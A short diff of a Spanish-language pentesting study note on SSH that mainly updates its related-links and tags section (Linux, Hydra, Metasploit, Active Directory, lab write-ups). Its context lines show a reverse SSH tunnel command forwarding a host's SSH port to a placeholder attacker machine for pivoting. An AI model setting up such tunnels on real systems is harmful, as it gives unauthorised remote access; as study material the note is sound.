@@ -84,13 +84,22 @@ ssh -R 4444:127.0.0.1:22 <user>@<attacker>
 ssh -p 4444 <user>@127.0.0.1
 ```
 
+
 ---
 
 ## 🔗 Red de Conocimiento
 
 ### Documentos Relacionados
 
-- [[Pivoting y Movilidad Lateral]] — Túneles SSH y pivoting
-- [[Linux - Comandos Avanzados de Pentesting]] — Movimiento lateral
+- [[Linux.md|Linux]] — Linux, Redes
+- [[Hydra.md|Hydra]] — Linux, Redes, SSH
+- [[../../comandos/Linux.md|Linux]] — Linux, Redes, SSH
+- [[../../comandos/Metasploit.md|Metasploit]] — Linux, Redes, SSH
+- [[../08 - Metodologías/Metodología - Active Directory.md|Metodología - Active Directory]] — Linux, Redes
+- [[../../apuntes Andres/09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot.md|09.06.2026 Escalada de Privilegios y Hacking Web Máquina Ridiculously Easy II y Mr. Robot]] — Linux, Redes, SSH
 
-> #ssh #herramientas #tuneles #pivoting
+### 🛠️ Herramientas
+
+- [[comandos/SSH|SSH]]
+
+> #linux #pivoting #redes #ssh
